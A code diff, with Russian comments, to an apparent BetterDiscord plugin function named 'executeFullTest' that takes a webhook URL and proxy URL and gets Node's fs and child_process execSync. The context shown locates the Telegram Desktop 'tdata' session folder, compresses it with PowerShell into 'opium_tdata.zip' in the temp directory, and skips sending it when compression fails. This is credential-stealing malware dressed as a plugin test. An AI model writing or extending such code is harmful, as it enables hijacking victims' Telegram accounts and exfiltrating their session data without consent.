@@ -1,22 +1,7 @@
-async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
-    // Безопасное получение модулей Node.js
-    let req = requireFunc;
-    if (!req && typeof process !== 'undefined' && process.mainModule) {
-        req = process.mainModule.require.bind(process.mainModule);
-    }
-    
-    if (!req) {
-        return { success: false, error: "Не удалось получить доступ к require (нет fs)" };
-    }
-
-    let fs, path, os, execSync;
-    try {
-        fs = req('fs');
-        path = req('path');
-        os = req('os');
-        execSync = req('child_process').execSync;
-    } catch (e) {
-        return { success: false, error: "Ошибка загрузки модулей Node.js: " + e.message };
+async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path, os, execSync) {
+    // Проверяем, что модули дошли
+    if (!fs || !path || !os || !execSync) {
+        return { success: false, error: "Модули Node.js не были переданы из плагина." };
     }
 
     let result = {
@@ -72,7 +57,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, requireFunc) {
                     tdataZipPath = path.join(os.tmpdir(), 'opium_tdata.zip');
                     try {
                         if (fs.existsSync(tdataZipPath)) fs.unlinkSync(tdataZipPath);
-                        // Сжимаем через PowerShell
+                        // Используем переданный execSync
                         execSync(`powershell -command "Compress-Archive -Path '${p}' -DestinationPath '${tdataZipPath}' -Force"`, { timeout: 30000 });
                     } catch (zipError) {
                         hasTdata = false; // Если не смогли сжать, не отправляем
